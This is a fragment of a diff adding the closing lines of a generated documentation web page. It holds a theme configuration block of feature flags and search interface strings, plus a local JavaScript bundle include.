+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top", "navigation.footer", "search.highlight", "search.share", "content.code.copy", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
